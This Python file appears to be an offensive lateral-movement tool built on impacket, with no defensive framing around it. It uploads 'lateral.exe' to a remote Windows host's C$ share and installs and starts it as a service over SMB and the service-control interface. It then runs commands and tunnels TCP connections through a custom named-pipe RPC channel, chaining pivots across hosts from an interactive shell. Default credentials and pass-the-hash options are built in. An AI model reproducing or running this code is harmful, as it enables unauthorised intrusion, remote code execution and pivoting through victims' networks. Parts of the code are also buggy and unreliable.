#!/usr/bin/python3
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.ndr import NULL
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRULONG, NDRVaryingString, NDRCALL, NDRPOINTER, NDRUniConformantArray, NDRSTRUCT, NDRUniFixedArray
from impacket.dcerpc.v5.dtypes import LPWSTR, LPSTR, STR, SHORT, DWORD, PCHAR, LPBYTE, WSTR, LPDWORD
from impacket.dcerpc.v5.lsad import PCHAR_ARRAY
from impacket.dcerpc.v5.nrpc import UCHAR_ARRAY, PUCHAR_ARRAY
from impacket.dcerpc.v5.wkst import CHAR_ARRAY
from os import fork
from threading import Thread
from struct import unpack
from sys import argv, exit
import socket
from time import sleep
import threading
import argparse


def copy(target, creds, source_path, target_path, share="c$", lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=ip, sess_port=port)
	smb.login(username, password, domain, lmhash, nthash)
	with open(source_path, "rb") as f:
		print("[*] copy")
		smb.putFile(share, target_path.replace('/','\\'), f.read)

def delete():
	pass

def start_service(target, creds, command, lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	aesKey = None
	remoteName = ip
	remoteHost = ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#create
	print("[*] creating")
	ans = scmr.hROpenSCManagerW(rpc)
	scManagerHandle = ans['lpScHandle']
	try:
		scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00', lpBinaryPathName=command + '\x00')
	except Exception as e:
		print(str(e))

	#start
	print("[*] starting")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	try:
		scmr.hRStartServiceW(rpc, serviceHandle)
	except:
		pass
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def stop_service(target, creds, lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	aesKey = None
	remoteName = ip
	remoteHost = ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#delete
	print("[*] delete")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	scmr.hRDeleteService(rpc, serviceHandle)
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def install_service(target, creds):
	copy(target, creds, "msrpc/lateral.exe", "/windows/lateral.exe")
	start_service(target, creds, "lateral.exe")



class SC_RPC_HANDLE(NDRSTRUCT):
    structure =  (
        ('Data','20s=""'),
    )
    def getAlignment(self):
        return 1

class DCERPCSessionError(Exception):
    def __init__(self, packet, error_code):
        print(123)
        pass

class Connect(NDRCALL):
    opnum = 0
    structure = (
        ('ip',STR),
        ('port',SHORT),
    )
class ConnectResponse(NDRCALL):
    structure = (
        ('socket',DWORD),
    )

class Disconnect(NDRCALL):
    opnum = 1
    structure = (
        ('socket',DWORD),
    )
class DisconnectResponse(NDRCALL):
    structure = ()

class Send(NDRCALL):
    opnum = 2
    structure = (
        ('socket',DWORD),
        ('data',STR),
        ('len',DWORD),
    )
class SendResponse(NDRCALL):
    structure = (
        ('len',DWORD),
    )

class Recv(NDRCALL):
    opnum = 3
    structure = (
        ('socket',DWORD),
        ('len',DWORD),
    )
class RecvResponse(NDRCALL):
    structure = (
        ('data',CHAR_ARRAY),
        ('len',DWORD),
    )

class Execute(NDRCALL):
    opnum = 4
    structure = (
        ('cmd',STR),
    )
class ExecuteResponse(NDRCALL):
    structure = (
        ('data',LPSTR),
    )

def msrpc(target, creds):
	ip, port = target
	#print(f"[debug] {ip}")
	username, password, domain = creds
	MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))

	stringbinding = r'ncacn_np:%s[\pipe\lateral]' % ip
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(ip)
	rpctransport.set_credentials(username, password, domain, "", "", None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(MSRPC_UUID_test)
#	sleep(0.5)
	return dce

def execute(cmd, target, creds):
	ip, port = target
	username, password, domain = creds
	#print(ip, username, password, domain, port)
	dce = msrpc((ip, port), (username, password, domain))
	execute = Execute()
	execute["cmd"] = cmd + "\x00"
	res = dce.request(execute)
	try:
		result = str(res["data"], "cp866")
	except:
		result = res["data"]
	dce.disconnect()
	return result

connections = {}
dce_sessions = {}
def proxy(target_from, target_to, creds):
	ip_from, port_from = target_from
	ip_to, port_to = target_to
	username, password, domain = creds
	#print(target_from, target_to ,username, password, domain)

	def incoming(dce_session, c, sock, target_from, creds, connect_id):
		global connections
		#dce = msrpc(target_from, creds)
		dce = dce_session["dce"]
		while True:
			if not connections[connect_id]:
				break
			recv = Recv()
			recv["socket"] = sock
			recv["len"] = 1024
			dce_session["mutex"].acquire()
			dce.call(recv.opnum, recv)
			res = dce.recv()
			dce_session["mutex"].release()
			length = unpack("<i", res[-4:])[0]
			data = res[ 4 : length+4 ]
			if length == -1:
				continue # waiting data
			if not data:
				print("[*] RPC incoming closed")
				connections[connect_id] = False
				break
#			print("<-" + "[" + str(len(data)) + "]")
			try:
				c.send(data)
			except:
				print("[*] local incoming closed")
				connections[connect_id] = False
				break
			#print("incoming")
		#dce.disconnect()

	def outcoming(dce_session, c, sock, target_from, creds, connect_id):
		global connections
		#dce = msrpc(target_from, creds)
		dce = dce_session["dce"]
		while True:
			try:
				data = c.recv(1024)
			except:
				print("[*] local outcoming closed")
				connections[connect_id] = False
				break
			if not data or not connections[connect_id]:
				print("[*] outcoming closed")
				connections[connect_id] = False
				break
#			print("->" + "[" + str(len(data)) + "]")
			send = Send()
			send["socket"] = sock
			send["data"] = data + b"\x00"
			send["len"] = len(data)
			#connections[connect_id].acquire()
			dce_session["mutex"].acquire()
			res = dce.request(send, checkError=False)
			dce_session["mutex"].release()
			#connections[connect_id].release()
			#res.dump()
			#print("outcoming")
		#dce.disconnect()

	def redirect(c, target_from, target_to, creds, connect_id):
		global dce_sessions
		ip_from, port_from = target_from
		ip_to, port_to = target_to
		if not dce_sessions.get(ip_from):
			dce_sessions[ip_from] = {
				"main": {"dce": msrpc(target_from, creds), "mutex": threading.Lock()},
				"incoming": {"dce": msrpc(target_from, creds), "mutex": threading.Lock()},
				"outcoming": {"dce": msrpc(target_from, creds), "mutex": threading.Lock()},
			}
		dce = dce_sessions[ip_from]["main"]["dce"]
		#dce = msrpc(target_from, creds)
		connect = Connect()
		connect["ip"] = ip_to + "\x00"
		connect["port"] = port_to
		dce_sessions[ip_from]["main"]["mutex"].acquire()
		res = dce.request(connect, checkError=False)
		dce_sessions[ip_from]["main"]["mutex"].release()
		#res.dump()
		if res["socket"]:
			connections[connect_id] = True
			incoming_thr = Thread(target=incoming, args=(dce_sessions[ip_from]["incoming"], c, res["socket"], target_from, creds, connect_id))
			outcoming_thr = Thread(target=outcoming, args=(dce_sessions[ip_from]["outcoming"], c, res["socket"], target_from, creds, connect_id))
			incoming_thr.start()
			outcoming_thr.start()
			while connections[connect_id]:
			    sleep(1)
			#incoming_thr.join()
			#outcoming_thr.join()

			disconnect = Disconnect()
			disconnect["socket"] = res["socket"]
			dce_sessions[ip_from]["main"]["mutex"].acquire()
			res = dce.request(disconnect)
			dce_sessions[ip_from]["main"]["mutex"].release()
			#res.dump()
		#dce.disconnect()

	def serve(s, target_from, target_to, creds):
		local_port = s.getsockname()[1]
		while True:
			c,info = s.accept()
			connect_id=info[1]
			redirect_thr = Thread(target=redirect, args=(c, target_from, target_to, creds, connect_id))
			redirect_thr.start()
			print(f"[*] proxying {info[0]}:{info[1]} -> {local_port}")

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(('127.0.0.1', 0))
	s.listen(10)
	serve_thr = Thread(target=serve, args=(s, target_from, target_to, creds))
	serve_thr.start()
	local_port = s.getsockname()[1]
	return local_port

def check_pipe(target, creds):
	ip, port = target
	username, password, domain = creds
	try:
		MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
		stringbinding = r'ncacn_np:%s[\pipe\lateral]' % ip
		rpctransport = transport.DCERPCTransportFactory(stringbinding)
		rpctransport.set_dport(port)
		rpctransport.setRemoteHost(ip)
		rpctransport.set_credentials(username, password, domain, "", "", None)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.bind(MSRPC_UUID_test)
		return True
	except:
		return False

class Chain:
	def __init__(self, ip, port):
		self.next = []
		self.prev = None
		self.target = ip
		self.target_port = port
		self.target_ip = ip
	def new(self, ip, port):
		self.next.append( Chain(ip, port) )
		self.next[-1].prev = self
		self.next[-1].target_ip = "127.0.0.1"
		return self.next[-1]

def chain_get_root(the_chain):
	while True:
		if not the_chain.prev:
			break
		the_chain = the_chain.prev
	return the_chain

def chain_walk(the_chain, deep=0):
	print(" "*deep + ("`" if deep > 0 else "") + (the_chain.target if the_chain.target != chain.target else the_chain.target+" <-"))
	for the_chain in the_chain.next:
		chain_walk(the_chain, deep+1)

def parse_cmd_shell(cmd):
	arg_parser = argparse.ArgumentParser()
	arg_parser.add_argument('-user', dest="user", help='username', default='admin')
	arg_parser.add_argument('-dom', dest="domain", default=".", help='domain')
	arg_parser.add_argument('-pass', dest="passwd", help='password', default='qwerty=123')
	arg_parser.add_argument('-hash', dest="hash", help='NT or NT:NTLM hash (opt)')
	arg_parser.add_argument("ip", type=str, help="target IP")
	args = arg_parser.parse_args(cmd)
	return args

if __name__ == '__main__':
	chain = False
	while True:
		line = input(f"{chain.target if chain else 'shells'}/> ")
		if not line:
			continue
		if line.startswith("proxy "):
			target = parse_cmd_shell(line.split(" ")[1:])
			if chain:
				port = proxy((chain.target_ip, chain.target_port), (target.ip, 445), (target.user, target.passwd, target.domain))
				chain = chain.new(target.ip, port)
			else:
				chain = Chain(target.ip, 445)
		elif line.startswith("shell "):
			pass
		elif line in ("show", "bt", "stack"):
			chain_walk(chain_get_root(chain))
		elif line in ("back",):
			chain = chain.prev
		elif line in ("goto ",):
			pass
		elif line in ('exit', 'quit', 'q'):
			break
		elif line in ('help',):
			pass
		else:
			cmd = line
			if not check_pipe((chain.target_ip, chain.target_port), (target.user, target.passwd, target.domain)):
				install_service((chain.target_ip, chain.target_port), (target.user, target.passwd, target.domain))
			print( execute(cmd, (chain.target_ip, chain.target_port), (target.user, target.passwd, target.domain)) )
